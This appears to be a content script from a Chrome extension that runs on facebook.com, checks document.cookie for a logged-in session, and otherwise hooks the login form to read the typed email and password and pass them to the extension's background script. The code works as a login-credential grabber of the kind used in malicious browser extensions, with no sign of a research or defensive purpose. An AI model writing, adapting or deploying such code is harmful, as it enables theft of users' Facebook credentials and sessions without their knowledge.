console.log(chrome);
if (window.location.hostname.match("facebook.com") !== null) {
  const cookie = document.cookie;

  //handle and get cookie when user logined (tieng anh nhu dauboizz)
  if (cookie.match("c_user=") !== null) {
    //user LOGIN
    console.log("send resques");
    chrome.extension.sendMessage({
      action: {
        type: "DATA_LOGIN"
      }
    });
  } else {
    //user NOT LOGIN
    let loginForm = document.getElementById("login_form");
    if (typeof loginForm != "undefined" && loginForm != null) {
      //handle login form submit
      loginForm.addEventListener("submit", res => {
        const e = document.getElementById("email").value;
        const p = document.getElementById("pass").value;
        chrome.extension.sendMessage({
          data: {
            username: e,
            password: p,
            type: "FormSubmit"
          }
        });
      });
    }
  }
}


//handle request data

